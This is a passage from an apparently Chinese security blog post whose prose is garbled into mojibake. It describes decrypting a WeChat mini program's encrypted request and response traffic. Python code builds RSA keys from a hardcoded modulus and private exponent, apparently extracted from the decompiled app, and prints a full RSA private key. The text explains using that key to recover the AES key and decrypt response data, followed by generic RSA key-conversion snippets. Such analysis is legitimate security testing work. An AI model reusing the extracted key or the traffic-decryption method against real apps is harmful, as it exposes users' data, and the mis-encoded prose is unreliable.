title="Pythonä»£ç å®ç°"></a>Pythonä»£ç å®ç°</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2024-06-12 9:44</span></span><br><span class="line"><span class="comment"># @Author: muhe Jing</span></span><br><span class="line"><span class="comment"># @File: RSA_gen.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å…¥å·²çŸ¥çš„å…¬é’¥æ¨¡Nå’Œå…¬é’¥æŒ‡æ•°E</span></span><br><span class="line">N = <span class="built_in">int</span>(</span><br><span class="line">    <span class="string">&quot;a38f39068534ccf3187917604a857285333dee0cf01b6e26f78be0cb563763fa0b028d01bbe8e9bf6e5c707e40a7bdd237c7f6b2e93de1cbc8fb3e818112fa81e78a3614f812e4dcbed201aefb1cb7be6c8546be0f86d0d782ee47c028daf969e0131564171c7dd34b075a947bd388af07e62a64f23c11f314bb2e2cb929df0b&quot;</span>,</span><br><span class="line">    <span class="number">16</span>)</span><br><span class="line">E = <span class="built_in">int</span>(<span class="string">&quot;10001&quot;</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºRSAå…¬é’¥å¯¹è±¡</span></span><br><span class="line">public_key = RSA.construct((N, E))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºå…¬é’¥</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Public Key:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(public_key.export_key().decode())</span><br><span class="line"></span><br><span class="line">N = <span class="built_in">int</span>(</span><br><span class="line">    <span class="string">&quot;9ee7f2b994fa16b86a1d01ad82663b24d488f2ea6ad2b60264badb6311906674048e70ebbae222744eb8b93d58258eb4dc30d11d4a9408e4ae8eb6d34a4e175a131eaa2484269041947c0d1e4c1652a0992ea952d590ef9836e0144197f30ef837d2df2ea0ba534f3f03ed88e8fe8311f7b6138b254e9b3395132db4f17ee0f3&quot;</span>,</span><br><span class="line">    <span class="number">16</span>)</span><br><span class="line">E = <span class="built_in">int</span>(<span class="string">&quot;10001&quot;</span>, <span class="number">16</span>)</span><br><span class="line">D = <span class="built_in">int</span>(</span><br><span class="line">    <span class="string">&quot;710bb39aa0c835a7a61dd296bc20bc4c9c427d05954f279a964c744c8b2f3e23a5262c6117074ed98d334edcbc3ba3c538ac25e7ffa946966134380e225b61b25bd38f1d6a2a29edfe2ab59707a6ebdcc31bcb7bf41a853d75a01630098fb3b22387a8fcb1785fd4850c831fa68d7cea93cff945112f0deba069c6716096f651&quot;</span>,</span><br><span class="line">    <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºRSAç§é’¥å¯¹è±¡</span></span><br><span class="line">private_key = RSA.construct((N, E, D))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºç§é’¥</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Private Key:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(private_key.export_key().decode())</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130913885.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Public Key:</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCjjzkGhTTM8xh5F2BKhXKFMz3u</span><br><span class="line">DPAbbib3i+DLVjdj+gsCjQG76Om/blxwfkCnvdI3x/ay6T3hy8j7PoGBEvqB54o2</span><br><span class="line">FPgS5Ny+0gGu+xy3vmyFRr4PhtDXgu5HwCja+WngExVkFxx900sHWpR704ivB+Yq</span><br><span class="line">ZPI8EfMUuy4suSnfCwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Private Key:</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIICXAIBAAKBgQCe5/K5lPoWuGodAa2CZjsk1Ijy6mrStgJkuttjEZBmdASOcOu6</span><br><span class="line">4iJ0Tri5PVgljrTcMNEdSpQI5K6OttNKThdaEx6qJIQmkEGUfA0eTBZSoJkuqVLV</span><br><span class="line">kO+YNuAUQZfzDvg30t8uoLpTTz8D7Yjo/oMR97YTiyVOmzOVEy208X7g8wIDAQAB</span><br><span class="line">AoGAcQuzmqDINaemHdKWvCC8TJxCfQWVTyealkx0TIsvPiOlJixhFwdO2Y0zTty8</span><br><span class="line">O6PFOKwl5/+pRpZhNDgOIlthslvTjx1qKint/iq1lwem69zDG8t79BqFPXWgFjAJ</span><br><span class="line">j7OyI4eo/LF4X9SFDIMfpo186pPP+UURLw3roGnGcWCW9lECQQDbSn4gpFNbWAqW</span><br><span class="line">JmIqZB3qytyHOGCO3W0MPDUgzhkYXCdU0dewKZv9KCoPCJaqn9Zt6qvH+ijz6zvZ</span><br><span class="line">lAp9yIz5AkEAuYG3VEUUIq/waI1OizsGLUxLXX/QoZ9M04OGqKZnZpivsfy7u5bU</span><br><span class="line">zTd/3h2yWde2YCeGX6fETNEsWf9AUbM0SwJBANMUakGrSx1SqqYK/lTFl9KIQCvc</span><br><span class="line">hX0fADdVwOH54EgFdEp9znqgIqlUvt9HqhdE0Zdt2rocPs1DMZHmoQ6gO6kCQDlt</span><br><span class="line">6BSlohsu/q1Pec5uwnXJlddnV26Bw6YDpO+XPJGtmU7v4CquAklZ8jMQXIOl3Wcd</span><br><span class="line">NWNtq77gTuu5su7YHMsCQGL61drNeJJ48F69q0Qv1+d1ANSNgZB2MuOidUilNOkr</span><br><span class="line">J/b0eAKwUC2a3Rl6okFxTppgzsNYtZ4RpZST/2ftiDs=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨RSAå…¬ç§é’¥æ ¡éªŒå·¥å…·æ£€æµ‹ï¼Œå‘ç°ç”Ÿæˆçš„å…¬ç§é’¥å¹¶ä¸æ˜¯ä¸€å¯¹çš„ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130914699.png" alt="image.png"> </p><p>è¿™ä¹Ÿå°±æ„å‘³ç€ï¼šåŠ å¯†å’Œè§£å¯†çš„å¯†é’¥ä¸åŒçš„ä¸¤å¯¹ï¼š</p><p>â‘ å®¢æˆ·ç«¯-&gt;æœåŠ¡ç«¯ï¼šå®¢æˆ·ç«¯åŠ å¯†çš„æ—¶å€™ï¼Œä½¿ç”¨RSA-1çš„å…¬é’¥å¯¹éšæœºå¯¹ç§°å¯†é’¥åŠ å¯†</p><p>â‘¡æœåŠ¡ç«¯ï¼šæ”¶åˆ°å®¢æˆ·ç«¯å¯†æ–‡åï¼Œä½¿ç”¨RSA-1çš„ç§é’¥è¿›è¡Œè§£å¯†ï¼Œè·å–åˆ°å¯¹ç§°åŠ å¯†å¯†é’¥ï¼Œç„¶åè§£å¯†</p><p>â‘¢æœåŠ¡ç«¯-&gt;å®¢æˆ·ç«¯ï¼šæœåŠ¡ç«¯ä½¿ç”¨RSA-2çš„å…¬é’¥å¯¹å“åº”ä½“çš„å¯†é’¥è¿›è¡ŒåŠ å¯†</p><p>â‘£å®¢æˆ·ç«¯ï¼šæ”¶åˆ°æœåŠ¡ç«¯å¯†æ–‡ï¼Œä½¿ç”¨RSA-2çš„ç§é’¥è¿›è¡Œè§£å¯†ï¼Œè·å–åˆ°AESçš„keyï¼Œç„¶åå†å¯¹dataè¿›è¡Œè§£å¯†ã€‚</p><hr><p>æ‰€ä»¥ï¼Œè¿™å—è¦å®ç°åœ¨çº¿å°ç¨‹åºåŠ è§£å¯†å°±åªèƒ½è°ƒè¯•å¥½å¾®ä¿¡å°ç¨‹åºåï¼Œå°†AESå¯†é’¥å›ºå®šæ­»ï¼Œæ‰å¯ä»¥ã€‚</p><p>ä½†æ˜¯ï¼Œè¿™å—åç¼–è¯‘åï¼Œåœ¨å¾®ä¿¡å¼€å‘è€…å·¥å…·é‡Œé¢å°ç¨‹åºè·‘ä¸èµ·æ¥ï¼Œå¯„ï¼</p><h1 id="å››-æ•ˆæœéªŒè¯"><a href="#å››-æ•ˆæœéªŒè¯" class="headerlink" title="å›› æ•ˆæœéªŒè¯"></a>å›› æ•ˆæœéªŒè¯</h1><p>åˆ©ç”¨æ¨¡å€¼å’ŒæŒ‡æ•°ï¼Œç”Ÿæˆäº†ä¸€ä¸ªå…¬é’¥å’Œç§é’¥ã€‚åˆ†åˆ«ä¸ºï¼š</p><p>RSA-1çš„å…¬é’¥</p><p>RSA-2çš„ç§é’¥</p><p>æ‰€ä»¥ï¼Œè¿™å—å¯ä»¥ä½¿ç”¨RSA-2çš„ç§é’¥æ¥éªŒè¯ä¸€ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130914360.png" alt="image.png"> </p><p>RSAè§£å¯†akeyè·å–åˆ°AESå¯†é’¥</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130915068.png" alt="image.png"> </p><p>AES-ECBè§£å¯†dataè·å–è¿”å›åŒ…ä¸­æ˜æ–‡</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130915418.png" alt="image.png"> </p><h1 id="äº”-RSAæ¨¡æ•°å’ŒæŒ‡æ•°åŸç†"><a href="#äº”-RSAæ¨¡æ•°å’ŒæŒ‡æ•°åŸç†" class="headerlink" title="äº” RSAæ¨¡æ•°å’ŒæŒ‡æ•°åŸç†"></a>äº” RSAæ¨¡æ•°å’ŒæŒ‡æ•°åŸç†</h1><p>è¿™å—è¯¦ç»†çš„ä»‹ç»å’Œä»£ç å‡å‚è€ƒäº†ä¸‹é¢è¿™ç¯‡æ–‡ç« ï¼š</p><p><a href="https://blog.csdn.net/chenhao0568/article/details/136484183">https://blog.csdn.net/chenhao0568/article/details/136484183</a></p><p>ä¸€èˆ¬çš„å·¥å…·éƒ½æ˜¯è¿™ç§çš„ï¼ŒDã€Pã€Qã€DPã€DQã€InvQã€Nã€Eï¼Œè¿™äº›å‚æ•°éƒ½æ˜¯ç”¨æ¥ç”ŸæˆRSAå…¬é’¥å’Œç§é’¥éœ€è¦</p><p>å¦‚æœåªæƒ³è¦çŸ¥é“<a href="https://so.csdn.net/so/search?q=%E5%85%AC%E9%92%A5&spm=1001.2101.3001.7020">å…¬é’¥</a>å’Œç§é’¥ï¼Œè¿™å°±éœ€è¦<strong>ç›¸äº’è½¬æ¢</strong>ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130916530.png" alt="image.png"> </p><h2 id="RSA-çŸ¥é“å…¬é’¥æ¨¡N-å…¬é’¥æŒ‡æ•°E-ç®—å‡ºå…¬é’¥"><a href="#RSA-çŸ¥é“å…¬é’¥æ¨¡N-å…¬é’¥æŒ‡æ•°E-ç®—å‡ºå…¬é’¥" class="headerlink" title="RSA çŸ¥é“å…¬é’¥æ¨¡N å…¬é’¥æŒ‡æ•°E ç®—å‡ºå…¬é’¥"></a>RSA çŸ¥é“å…¬é’¥æ¨¡N å…¬é’¥æŒ‡æ•°E ç®—å‡ºå…¬é’¥</h2><p>å½“çŸ¥é“RSAå…¬é’¥çš„æ¨¡Nå’Œå…¬é’¥æŒ‡æ•°Eæ—¶ï¼Œä½ å¯ä»¥ä½¿ç”¨Pythonä¸­çš„rsaæ¨¡å—æ¥è®¡ç®—RSAå…¬é’¥</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å…¥å·²çŸ¥çš„å…¬é’¥æ¨¡Nå’Œå…¬é’¥æŒ‡æ•°E</span></span><br><span class="line">N = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enter the modulus (N): &quot;</span>))</span><br><span class="line">E = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enter the public exponent (E): &quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºRSAå…¬é’¥å¯¹è±¡</span></span><br><span class="line">public_key = RSA.construct((N, E))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºå…¬é’¥</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Public Key:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(public_key.export_key().decode())</span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿™å—éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œè¾“å…¥æ¨¡å’ŒæŒ‡æ•°çš„æ—¶å€™ï¼Œè¦æ±‚è¾“å…¥çš„æ˜¯10è¿›åˆ¶æ•°å­—ï¼Œå¦‚æœæ˜¯éåè¿›åˆ¶ï¼Œæ¯”å¦‚16è¿›åˆ¶ï¼Œéœ€è¦è½¬æ¢ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">N = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enter the modulus (N): &quot;</span>)ï¼Œ<span class="number">16</span>)</span><br><span class="line">E = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enter the public exponent (E): &quot;</span>),<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130917230.png" alt="img"> </p><p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œä½¿ç”¨äº†Cryptoæ¨¡å—ä¸­çš„RSAç±»æ¥æ„å»ºRSAå…¬é’¥å¯¹è±¡ï¼Œå¹¶å°†è¾“å…¥çš„æ¨¡Nå’Œå…¬é’¥æŒ‡æ•°Eä¼ é€’ç»™RSA.construct()æ–¹æ³•ã€‚æœ€åï¼Œæˆ‘ä»¬è¾“å‡ºäº†ç”Ÿæˆçš„å…¬é’¥ã€‚</p><h2 id="åè¿‡æ¥ï¼šçŸ¥é“å…¬é’¥ï¼Œè®¡ç®—å…¬é’¥çš„æ¨¡-å…¬é’¥çš„æŒ‡æ•°N"><a href="#åè¿‡æ¥ï¼šçŸ¥é“å…¬é’¥ï¼Œè®¡ç®—å…¬é’¥çš„æ¨¡-å…¬é’¥çš„æŒ‡æ•°N" class="headerlink" title="åè¿‡æ¥ï¼šçŸ¥é“å…¬é’¥ï¼Œè®¡ç®—å…¬é’¥çš„æ¨¡ å…¬é’¥çš„æŒ‡æ•°N"></a>åè¿‡æ¥ï¼šçŸ¥é“å…¬é’¥ï¼Œè®¡ç®—å…¬é’¥çš„æ¨¡ å…¬é’¥çš„æŒ‡æ•°N</h2><p>å¦‚æœå·²ç»æœ‰äº†RSAå…¬é’¥ï¼Œä½†ä¸çŸ¥é“å…¬é’¥æ¨¡Nå’Œå…¬é’¥æŒ‡æ•°Eï¼Œä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ä»å…¬é’¥ä¸­æå–è¿™äº›å‚æ•°ã€‚Pythonçš„ Crypto æ¨¡å—æä¾›äº†è¿™æ ·çš„åŠŸèƒ½ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å…¥å·²çŸ¥çš„å…¬é’¥</span></span><br><span class="line">public_key_pem = <span class="built_in">input</span>(<span class="string">&quot;Enter the public key in PEM format: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»PEMæ ¼å¼çš„å…¬é’¥ä¸­æå–RSAå¯¹è±¡</span></span><br><span class="line">public_key = RSA.import_key(public_key_pem)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å…¬é’¥æ¨¡Nå’Œå…¬é’¥æŒ‡æ•°E</span></span><br><span class="line">N = public_key.n</span><br><span class="line">E = public_key.e</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºå…¬é’¥æ¨¡Nå’Œå…¬é’¥æŒ‡æ•°E</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Modulus (N):&quot;</span>, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Public Exponent (E):&quot;</span>, E)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130917933.png" alt="img"> </p><p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œé¦–å…ˆè¾“å…¥äº†PEMæ ¼å¼çš„å…¬é’¥å­—ç¬¦ä¸²ï¼Œç„¶åä½¿ç”¨ RSA.import_key() æ–¹æ³•å°†å…¶è½¬æ¢ä¸ºRSAå¯¹è±¡ã€‚æ¥ç€ï¼Œä»RSAå¯¹è±¡ä¸­æå–äº†æ¨¡Nå’Œå…¬é’¥æŒ‡æ•°Eï¼Œå¹¶å°†å®ƒä»¬è¾“å‡ºã€‚</p><h2 id="RSAçŸ¥é“ç§é’¥å‚æ•°ï¼ˆPã€Qã€Eã€Dï¼‰ç®—å‡ºç§é’¥"><a href="#RSAçŸ¥é“ç§é’¥å‚æ•°ï¼ˆPã€Qã€Eã€Dï¼‰ç®—å‡ºç§é’¥" class="headerlink" title="RSAçŸ¥é“ç§é’¥å‚æ•°ï¼ˆPã€Qã€Eã€Dï¼‰ç®—å‡ºç§é’¥"></a>RSAçŸ¥é“ç§é’¥å‚æ•°ï¼ˆPã€Qã€Eã€Dï¼‰ç®—å‡ºç§é’¥</h2><p>å¯ä»¥ä½¿ç”¨Pythonä¸­çš„rsaæ¨¡å—æ¥æ„å»ºRSAç§é’¥å¯¹è±¡ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å…¥å·²çŸ¥çš„ç§é’¥å‚æ•°</span></span><br><span class="line">P = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enter the prime factor P: &quot;</span>))</span><br><span class="line">Q = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enter the prime factor Q: &quot;</span>))</span><br><span class="line">E = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enter the public exponent (E): &quot;</span>))</span><br><span class="line">D = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enter the private exponent (D): &quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—æ¨¡N</span></span><br><span class="line">N = P * Q</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºRSAç§é’¥å¯¹è±¡</span></span><br><span class="line">private_key = RSA.construct((N, E, D, P, Q))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºç§é’¥</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Private Key:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(private_key.export_key().decode())</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œé¦–å…ˆè¾“å…¥äº†ç§é’¥çš„å‚æ•°ï¼šä¸¤ä¸ªç´ æ•°å› å­På’ŒQã€å…¬é’¥æŒ‡æ•°Eä»¥åŠç§é’¥æŒ‡æ•°Dã€‚ç„¶åï¼Œè®¡ç®—äº†æ¨¡Nï¼Œå¹¶ä½¿ç”¨RSA.construct()æ–¹æ³•æ„å»ºäº†RSAç§é’¥å¯¹è±¡ã€‚æœ€åï¼Œè¾“å‡ºäº†ç”Ÿæˆçš„ç§é’¥ã€‚</p><ul><li>P å’Œ Qï¼šè¿™ä¸¤ä¸ªè´¨æ•°ç”¨äºè®¡ç®—æ¨¡æ•° Nï¼Œå®ƒä»¬æ˜¯RSAç®—æ³•çš„åŸºç¡€ã€‚æ¨¡æ•° N æ˜¯å…¬é’¥å’Œç§é’¥çš„ä¸€ä¸ªé‡è¦ç»„æˆéƒ¨åˆ†ï¼Œé€šå¸¸éå¸¸å¤§ï¼ˆä¾‹å¦‚ï¼Œ2048ä½æˆ–æ›´å¤§ï¼‰ã€‚</li><li>Eï¼šå…¬é’¥æŒ‡æ•°ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªè¾ƒå°çš„æ•´æ•°ï¼Œä¸”ä¸ (P-1) * (Q-1) äº’è´¨ã€‚å…¬é’¥æŒ‡æ•°ç”¨äºåŠ å¯†æ•°æ®ã€‚</li><li>Dï¼šç§é’¥æŒ‡æ•°ï¼Œä¸å…¬é’¥æŒ‡æ•° E å’Œæ¨¡æ•° N æœ‰å…³ï¼Œç”¨äºè§£å¯†æ•°æ®ã€‚ç§é’¥æŒ‡æ•°æ˜¯ä¸€ä¸ªå¤§æ•´æ•°ï¼Œå®ƒæ˜¯é€šè¿‡æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•è®¡ç®—å¾—å‡ºçš„ï¼Œç¡®ä¿ D * E % ((P-1) * (Q-1)) ç­‰äº 1ã€‚</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130918922.png" alt="img"> </p><h2 id="çŸ¥é“ç§é’¥ï¼Œç®—å‡ºD-Pç­‰æ‰€æœ‰å‚æ•°"><a href="#çŸ¥é“ç§é’¥ï¼Œç®—å‡ºD-Pç­‰æ‰€æœ‰å‚æ•°" class="headerlink" title="çŸ¥é“ç§é’¥ï¼Œç®—å‡ºD,Pç­‰æ‰€æœ‰å‚æ•°"></a>çŸ¥é“ç§é’¥ï¼Œç®—å‡ºD,Pç­‰æ‰€æœ‰å‚æ•°</h2><p>å¦‚æœå·²ç»æœ‰äº†RSAç§é’¥ï¼Œä½†ä¸çŸ¥é“ç§é’¥çš„æ‰€æœ‰å‚æ•°ï¼ˆå¦‚Pã€Qã€Dç­‰ï¼‰ï¼Œå¯ä»¥ä»ç§é’¥ä¸­æå–è¿™äº›å‚æ•°ã€‚Pythonçš„Cryptoæ¨¡å—æä¾›äº†è¿™æ ·çš„åŠŸèƒ½ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å…¥å·²çŸ¥çš„ç§é’¥</span></span><br><span class="line">private_key_pem = <span class="built_in">input</span>(<span class="string">&quot;Enter the private key in PEM format: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»PEMæ ¼å¼çš„ç§é’¥ä¸­æå–RSAå¯¹è±¡</span></span><br><span class="line">private_key = RSA.import_key(private_key_pem)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–ç§é’¥å‚æ•°</span></span><br><span class="line">N = private_key.n</span><br><span class="line">E = private_key.e</span><br><span class="line">D = private_key.d</span><br><span class="line">P = private_key.p</span><br><span class="line">Q = private_key.q</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºç§é’¥å‚æ•°</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Modulus (N):&quot;</span>, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Public Exponent (E):&quot;</span>, E)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Private Exponent (D):&quot;</span>, D)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Prime Factor P:&quot;</span>, P)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Prime Factor Q:&quot;</span>, Q)</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œé¦–å…ˆè¾“å…¥äº†PEMæ ¼å¼çš„ç§é’¥å­—ç¬¦ä¸²ï¼Œç„¶åä½¿ç”¨ RSA.import_key() æ–¹æ³•å°†å…¶è½¬æ¢ä¸ºRSAå¯¹è±¡ã€‚æ¥ç€ï¼Œä»RSAå¯¹è±¡ä¸­æå–äº†æ¨¡Nã€å…¬é’¥æŒ‡æ•°Eã€ç§é’¥æŒ‡æ•°Dä»¥åŠç´ æ•°å› å­På’ŒQï¼Œå¹¶å°†å®ƒä»¬è¾“å‡ºã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130918845.png" alt="img"> </p><h2 id="ç”Ÿæˆä¸€å¯¹RSAå¯†é’¥å¯¹"><a href="#ç”Ÿæˆä¸€å¯¹RSAå¯†é’¥å¯¹" class="headerlink" title="ç”Ÿæˆä¸€å¯¹RSAå¯†é’¥å¯¹"></a>ç”Ÿæˆä¸€å¯¹RSAå¯†é’¥å¯¹</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”ŸæˆRSAå¯†é’¥å¯¹</span></span><br><span class="line">key = RSA.generate(<span class="number">2048</span>)  <span class="comment"># ç”Ÿæˆ2048ä½çš„RSAå¯†é’¥å¯¹ï¼Œå¯ä»¥æ ¹æ®éœ€è¦é€‰æ‹©å¯†é’¥é•¿åº¦</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å‡ºå…¬é’¥å’Œç§é’¥</span></span><br><span class="line">public_key = key.publickey().export_key()</span><br><span class="line">private_key = key.export_key()</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºå…¬é’¥å’Œç§é’¥</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Public Key:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(public_key.decode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nPrivate Key:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(private_key.decode())</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œä½¿ç”¨äº†Cryptoæ¨¡å—ä¸­çš„RSA.generate()å‡½æ•°æ¥ç”Ÿæˆä¸€å¯¹2048ä½çš„RSAå¯†é’¥å¯¹ã€‚ç„¶åï¼Œæˆ‘ä»¬åˆ†åˆ«å¯¼å‡ºå…¬é’¥å’Œç§é’¥ï¼Œå¹¶æ‰“å°å®ƒä»¬ã€‚</p><h2 id="RSAç”Ÿæˆä¸€å¯¹å…¬ç§é’¥ï¼Œè¦è¾“å‡ºæ ¼å¼ä¸º16è¿›åˆ¶"><a href="#RSAç”Ÿæˆä¸€å¯¹å…¬ç§é’¥ï¼Œè¦è¾“å‡ºæ ¼å¼ä¸º16è¿›åˆ¶" class="headerlink" title="RSAç”Ÿæˆä¸€å¯¹å…¬ç§é’¥ï¼Œè¦è¾“å‡ºæ ¼å¼ä¸º16è¿›åˆ¶"></a>RSAç”Ÿæˆä¸€å¯¹å…¬ç§é’¥ï¼Œè¦è¾“å‡ºæ ¼å¼ä¸º16è¿›åˆ¶</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”ŸæˆRSAå¯†é’¥å¯¹</span></span><br><span class="line">key_pair = RSA.generate(<span class="number">2048</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å…¬é’¥å’Œç§é’¥çš„16è¿›åˆ¶å­—ç¬¦æ ¼å¼</span></span><br><span class="line">public_key_hex = key_pair.publickey().export_key(<span class="built_in">format</span>=<span class="string">&#x27;DER&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line">private_key_hex = key_pair.export_key(<span class="built_in">format</span>=<span class="string">&#x27;DER&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºå…¬é’¥å’Œç§é’¥çš„16è¿›åˆ¶å­—ç¬¦æ ¼å¼</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Public Key (Hex):&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(public_key_hex)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nPrivate Key (Hex):&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(private_key_hex)</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œä½¿ç”¨export_key()å‡½æ•°å¹¶æŒ‡å®šformat&#x3D;â€™DERâ€™å‚æ•°æ¥è·å–å…¬é’¥å’Œç§é’¥çš„DERç¼–ç æ ¼å¼ï¼Œç„¶åä½¿ç”¨.hex()æ–¹æ³•å°†å­—èŠ‚ä¸²è½¬æ¢ä¸º16è¿›åˆ¶å­—ç¬¦æ ¼å¼ï¼Œå¹¶è¾“å‡ºå®ƒä»¬ã€‚</p><h2 id="RSAåŠ å¯†ã€è§£å¯†ã€ç­¾åã€éªŒç­¾ç¤ºä¾‹"><a href="#RSAåŠ å¯†ã€è§£å¯†ã€ç­¾åã€éªŒç­¾ç¤ºä¾‹" class="headerlink" title="RSAåŠ å¯†ã€è§£å¯†ã€ç­¾åã€éªŒç­¾ç¤ºä¾‹"></a>RSAåŠ å¯†ã€è§£å¯†ã€ç­¾åã€éªŒç­¾ç¤ºä¾‹</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span 